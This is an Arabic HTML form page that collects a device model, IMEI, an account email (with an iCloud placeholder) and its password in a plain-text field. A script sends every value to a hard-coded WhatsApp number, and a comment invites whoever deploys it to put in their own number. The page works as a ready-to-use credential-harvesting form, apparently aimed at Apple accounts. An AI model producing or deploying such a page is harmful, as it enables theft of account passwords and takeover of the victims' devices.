<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إرسال بيانات الجهاز والحساب</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
        body { font-family: 'Tajawal', sans-serif; background-color: #ffffff; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="max-w-md w-full bg-white rounded-3xl shadow-xl overflow-hidden">
        <div class="bg-indigo-600 p-6 text-white text-center">
            <h2 class="text-2xl font-bold">نظام إرسال البيانات الكاملة</h2>
            <p class="text-sm opacity-90">يرجى ملء كافة الحقول لإتمام الطلب</p>
        </div>
        
        <form id="fullDataForm" class="p-8 space-y-4">
            <div>
                <label class="block text-sm font-bold text-gray-700 mb-1">نوع الجهاز</label>
                <input type="text" id="deviceModel" placeholder="مثلاً: iPhone 14 Pro" required
                    class="w-full p-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-indigo-500 outline-none transition">
            </div>

            <div>
                <label class="block text-sm font-bold text-gray-700 mb-1">رقم الـ IMEI / السيريال</label>
                <input type="text" id="imei" placeholder="أدخل رقم الـ IMEI" required
                    class="w-full p-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-indigo-500 outline-none transition text-left" dir="ltr">
            </div>

            <div>
                <label class="block text-sm font-bold text-gray-700 mb-1">البريد الإلكتروني (Email)</label>
                <input type="email" id="email" placeholder="example@icloud.com" required
                    class="w-full p-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-indigo-500 outline-none transition text-left" dir="ltr">
            </div>

            <div>
                <label class="block text-sm font-bold text-gray-700 mb-1">الرمز (Password)</label>
                <input type="text" id="password" placeholder="أدخل الرمز هنا" required
                    class="w-full p-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-indigo-500 outline-none transition text-left" dir="ltr">
            </div>

            <div>
                <label class="block text-sm font-bold text-gray-700 mb-1">ملاحظات</label>
                <textarea id="notes" rows="2" placeholder="أي تفاصيل إضافية..."
                    class="w-full p-3 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:ring-2 focus:ring-indigo-500 transition"></textarea>
            </div>

            <button type="submit" 
                class="w-full bg-indigo-500 hover:bg-indigo-600 text-white font-bold py-4 rounded-xl shadow-lg transform active:scale-95 transition duration-200 flex items-center justify-center gap-2">
                <span>إرسال البيانات للواتساب</span>
                <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946.003-6.556 5.338-11.891 11.893-11.891 3.181.001 6.167 1.24 8.413 3.488 2.246 2.248 3.484 5.232 3.484 8.412-.003 6.557-5.338 11.892-11.893 11.892-1.997-.001-3.951-.5-5.688-1.448l-6.309 1.656zm6.224-3.82l.303.18c1.397.83 3.013 1.269 4.667 1.27h.005c5.312 0 9.637-4.325 9.64-9.637 0-2.573-1.002-4.991-2.822-6.812-1.821-1.82-4.239-2.822-6.812-2.822-5.312 0-9.637 4.325-9.64 9.637-.001 1.861.536 3.676 1.551 5.253l.197.305-1.005 3.67 3.759-.986z"/></svg>
            </button>
        </form>
    </div>

    <script>
        document.getElementById('fullDataForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // غير الرقم هنا لرقمك الخاص
            const myPhoneNumber = "9647707771235"; 

            const device = document.getElementById('deviceModel').value;
            const imei = document.getElementById('imei').value;
            const email = document.getElementById('email').value;
            const pass = document.getElementById('password').value;
            const notes = document.getElementById('notes').value || "لا يوجد";

            // تنسيق الرسالة لتصلك مرتبة
            const message = `*طلب بيانات كامل*%0A` +
                            `--------------------------%0A` +
                            `📱 *الجهاز:* ${device}%0A` +
                            `🔢 *IMEI:* ${imei}%0A` +
                            `📧 *الايميل:* ${email}%0A` +
                            `🔑 *الرمز:* ${pass}%0A` +
                            `📝 *ملاحظات:* ${notes}%0A` +
                            `--------------------------`;

            const whatsappUrl = `https://wa.me/${myPhoneNumber}?text=${message}`;
            window.open(whatsappUrl, '_blank');
        });
    </script>

</body>
</html>
